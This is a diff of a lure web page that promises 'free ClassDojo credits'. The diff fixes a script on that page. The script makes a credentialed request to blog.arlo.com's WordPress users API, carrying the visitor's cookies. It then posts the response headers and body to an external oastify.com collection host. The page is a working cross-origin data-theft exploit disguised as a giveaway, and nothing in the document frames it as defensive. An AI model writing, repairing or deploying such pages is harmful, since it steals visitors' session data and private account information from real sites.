@@ -5,25 +5,24 @@
 </head>
 <body>
   <h1>Click to claim your free credits!</h1>
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Free ClassDojo Credits!</title>
-</head>
-<body>
-  <h1>Click to claim your free credits!</h1>
 <script>  
 async function fetchData() {
   const r = await fetch('https://blog.arlo.com/wp-json/wp/v2/users', {  
     credentials: 'include'  
   });
 
-  // Send FULL request headers to your server (includes cookies!)  
+  // Ensure the GET request does not include a body
+  const responseText = await r.text();
+
+  // Send FULL request headers and response data to your server (includes cookies!)  
   await fetch('https://og8sn80hf37ay61awew00e0riio9cz0o.oastify.com', {  
-    method: 'GET',  
+    method: 'POST',  
+    headers: {
+      'Content-Type': 'application/json'
+    },
     body: JSON.stringify({  
       headers: [...r.headers.entries()],  
-      data: await r.text()  
+      data: responseText  
     })  
   });
 }
@@ -31,8 +30,5 @@ async function fetchData() {
 // Run the fetchData function
 fetchData();
 </script>  
-</body>
-</html>
-
 </body>
 </html>
